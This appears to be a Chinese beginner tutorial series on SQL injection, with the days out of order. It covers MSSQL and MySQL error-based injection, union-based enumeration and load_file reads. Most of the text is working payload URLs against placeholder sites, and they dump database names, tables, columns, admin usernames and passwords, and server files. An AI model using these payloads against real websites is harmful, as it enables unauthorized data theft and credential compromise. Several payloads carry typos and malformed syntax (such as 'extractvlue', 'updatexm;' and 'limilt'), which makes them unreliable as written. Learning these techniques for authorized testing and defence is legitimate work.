web入门SQL注入第八天

主题：sqlsever报错注入
一、显示系统信息
and @@version>0 利用mssql在转换类型出错，会显示系统信息
eg:http://www.demo1.com/index.aspx?id=-1 and @@version>0

二、爆出数据库
eg:http://www.demo1.com/index.aspx?id=-1 and db_name()>0

三、当前用户（dbo为最高权限）
eg:http://www.demo1.com/index.aspx?id=-1 and User_Name()>0

四、爆出其他数据库
eg:http://www.demo1.com/index.aspx?id=-1 and (SELECT top 1 Name FROM Master..SysDatabases)>0
http://www.demo1.com/index.aspx?id=-1 and (SELECT top 1 Name FROM Master..SysDatabases where name not in (‘master’))>0（查出的库名依次加入（’ ‘）内）

五、爆表
eg:http://www.demo1.com/index.aspx?id=-1 and (SELECT top 1 Name FROM 【mydb].sys.all_objects where type=’U’ and is_ms_shipped=0)>0
http://www.demo1.com/index.aspx?id=-1 and (SELECT top 1 Name FROM mydb.sys.all_objects where type=’U’ and is_ms_shipped=0 and name not in (‘admin’))>0

六、爆列
eg:http://www.demo1.com/index.aspx?id=-1 and (SELECT top 1 column_Name FROM mydb.information_schema.columns where table_name=’admin’ and column_name not in(‘ID’,))>0
http://www.demo1.com/index.aspx?id=-1 and (SELECT top 1 column_Name FROM mydb.information_schema.columns where table_name=’admin’ and column_name not in(‘ID’,’username’))>0

七、爆数据
eg:http://www.demo1.com/index.aspx?id=-1 and (SELECT top 1 password from admin)>0

web入门SQL注入第五天

主题：mysql+php报错注入
一、原理
mysql在执行SQL语句的时候，如果语句有错，会返回报错信息，使用mysql_error()语句可以把报错信息显示出来
eg:$result=mysql_query(“select*from article where id=$id”) or die(mysql_error());

二、步骤
1.判断注入
and 1=1
and 1=2
2.爆库
id=info()得到当前库的名 FUNCTION target_sys.info does not exist target_sys就是当前库的名

三、一些报错语句
1.通过floor报错(无版本限制）
/数据库版本/
and(select 1 from(select count(*),concat((select(select(select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/简单方法爆库/
id=info()

/连接用户/
and(select 1 from(select count(*),concat((select(select(select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/连接数据库/
and(select 1 from(select count(*),concat((select(select(select concat(0x7e,database()，0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/爆库/
and(select 1 from(select count(*),concat((select(select(select distinct
concat(0x7e,schema_name,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/爆表/
and(select 1 from(select count(*),concat((select(select(select distinct
concat(0x7e,table_name,0x7e) from information_schema.tables where table_name=0x61646D696E limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/爆字段/

and(select 1 from(select count(*),concat((select(select(select distinct
concat(0x7e,column_name,0x7e) from information_schema.columns
where table_name=0x61646D696E limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

/爆内容/
and(select 1 from(select count(*),concat((select(select(select distinct
concat(0x23,username,0x3a,passward,0x23) from admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)

2.ExtractValue(有长度限制，最长32位）（可能有版本限制）
and extractvlue(1,concat(0x7e,(select @@version),0x7e))
and extractvlue(1,concat(0x7e,(select distinct concat(0x23,username,0x3a,password,0x23)from admin limit 0,1)))

3.UpdateXml(有长度限制，最长32位）（可能有版本限制）
and updatexml(1,concat(0x7e,(select @@version),0x7e),1)
and updatexm;(1,concat(0x7e,(select distinct concat(0x23,username,0x3a,password,0x23)from admin limit 0,1),0x7e),1)

四、应对长度限制
length函数查询长度
eg:http://target_sys.com/mysqlinj.php?id=-1 and updatexml(1.concat(0x7e,(select distinct length(concat(0x23,username,0x3a,password,0x23)) from admin limit 0,1),0x7e),1)
查询结果为40
substring（）字符串截取函数
查询1-31
http://target_sys.com/mysqlinj.php?id=-1 and updatexml(1.concat(0x7e,(select distinct
substring(concat(0x23,username,0x3a,password,0x23),1,32) from admin limit 0,1),0x7e),1)
查询32-40
http://target_sys.com/mysqlinj.php?id=-1 and updatexml(1.concat(0x7e,(select distinct
substring(concat(0x23,username,0x3a,password,0x23),33,40) from admin limit 0,1),0x7e),1)

web入门SQL注入第四天

主题：mysql+php读写操作
一、注意1
mysql新特性secure_file_priv对读写文件的影响
此开关默认为NULL，即不允许导入导出
secure_file_priv为空时方可读写，由于该参数不能动态修改，只能在mysql的配置文件中进行修改，然后重启生效
查看命令：select @@secure_file_priv
secure_file_priv为null表示不允许导入导出
secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定文件夹
secure_file_priv没有设置时，表示没有任何限制

二、注意2
写入文件时还需要看php.ini里gpc是否开启。若gpc开启，特殊字符都会被转义
eg:’变成'

三、读写操作
1.两个函数
load_file()读取文件函数
读取当前目录下的index.php文件
eg:http://target_sys.com/article.php?id=-1 union select 1,2,load_file(‘C:\inetpub\wwwroot\target_sys.com\index.php’)
或为http://target_sys.com/article.php?id=-1 union select 1,2,load_file(‘C:/inetpub/wwwroot/target_sys.com/index.php’) 文件路径转为十六进制也可读取，此时不需要加单引号

web入门SQL注入第三天

主题：mysql+php手工注入篇 爆库 爆表 爆字段
一、查询所有的库
group_concat()查询库名
eg:http://target_sys.com/article.php?id=-1 union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 0,1 （之后把0依次3换为1，2，3等等）
或 http://target_sys.com/article.php?id=-1 union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA

二、查询库里所有的表
eg:http://target_sys.com/article.php?id=-1 union select 1,2,group_concat(SCHEMA_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()

三、查询表里所有字段
eg:http://target_sys.com/article.php?id=-1 union select 1,2,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=0x61646d696e (16进制数为admin转16进制)

四、查询数据
eg:http://target_sys.com/article.php?id=-1 union select 1,2,group_concat(username,0x3a,password) from admin

五、查询失败的原因
有时候查询不全，原因是字段大小问题。
解决方法：换一个字段查询，或用函数查询长度再用字符串函数截取

六、方法特点
速度快，但不通用(可能查不全）

一、三类（数据类型）SQL注入
1.int 整型
select *from user where id=1
2.string 字符型
select *from user where username=’admin’
3.like 搜索型
select *from news where title like ‘%标题%’

二、注入方法
1.联合查询注入
2.报错注入
3.盲注入
a.布尔型注入
b.时间型注入

三、常用语句
1.version() 查询MySQL版本
2.user（） 查询数据库用户名
3.database（） 查询数据库名
4.@@datadir 查询数据库路径
5.@@version_compile_os 查询操作系统版本
6.user() 用户名 system_user() 系统用户名 current_user() 当前用户名 session_user()连接数据库的用户名
7.@@basedir MYSQL 安装路径
四、注释
1.#
2.–空格
3./**/

五、判断是否存在注入

  1. and 1=1 正常 或为&& 1=1 (%26%261=1)
    and 1=2 错误（包括转码后 %26%261=2)
  2. or 1=1 或为||1=1
    or 1=2

六、判断列数
order by
eg:order by 3

七、联合查询
union select 查询两个表的内容
eg:网址?id=1 and 1=2 union select 1,2,3 (2和3可替换为查询语句）（union前为假）

八、查询库名
把数字替换为database()

九、查询表名
mysql中库information_schema中存有很多信息
eg:http://target_sys.com/article.php?id=-1 union select 1,2,TABLE_NAME from information_schema.TABLE_SCHEMA=database() limilt 0,1 (database()与target_sys相同，target_sys可转为16进制0x ) (把0改为1获取第二个表名，以此类推，直至返回空）

十、查询字段
